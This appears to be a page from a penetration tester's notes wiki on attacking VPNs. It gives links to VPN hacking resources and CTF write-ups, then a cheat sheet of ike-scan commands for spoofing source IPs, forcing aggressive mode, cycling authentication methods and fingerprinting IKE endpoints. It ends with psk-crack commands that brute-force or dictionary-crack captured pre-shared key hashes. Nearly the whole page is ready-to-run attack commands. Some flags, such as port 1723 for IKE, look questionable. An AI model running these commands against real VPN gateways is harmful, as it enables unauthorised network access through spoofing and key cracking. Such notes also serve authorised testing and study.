# 🟡 VPNs

## <mark style="color:red;">Resources</mark>

{% embed url="https://github.com/0x90/vpn-arsenal" %}

{% embed url="https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools" %}

{% embed url="http://devloop.users.sourceforge.net/index.php?article108%2Fsolution-du-ctf-hacklab-vulnvpn=" %}

{% embed url="https://resources.infosecinstitute.com/vulnvpn#gref" %}

{% embed url="https://0xrick.github.io/hack-the-box/conceal#ike-scan-Setting-up-The-Connection" %}

## <mark style="color:red;">Techniques</mark> <a href="#exploitation-techniques" id="exploitation-techniques"></a>

### <mark style="color:orange;">IKEv2 Authenthication IP spoofing</mark>

```
ike-scan --sport=1723 --dport=1723 --sourceip=IP_To_Spoof --ikev2 <IP>
```

#### Trying all authentication modes

```
ike-scan --dport=1723 --auth=1 <IP>
ike-scan --dport=1723 --auth=3 <IP>
ike-scan --dport=1723 --auth=64221 <IP>
```

#### IP spoofing using ike-scan

```
ike-scan --dport=1723 --sourceip=IP_To_Spoof  --auth=1 <IP>
ike-scan --dport=1723 --sourceip=IP_To_Spoof  --auth=3 <IP>
ike-scan --dport=1723 --sourceip=IP_To_Spoof  --auth=64221 <IP>
```

#### IP spoofing and agressive mode

```
ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=1 <IP>
ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=3 <IP>
ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=64221 <IP>
```

#### Show fingerprint

```
ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=1 --showbackoff <IP>
ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=3 --showbackoff <IP>
ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=64221 --showbackoff <IP>
```

#### Crack the key using psk-crack

```
psk-crack hash-file.txt
psk-crack -b 5 IP
psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" <IP>
psk-crack -d wordlist.txt <IP>
```
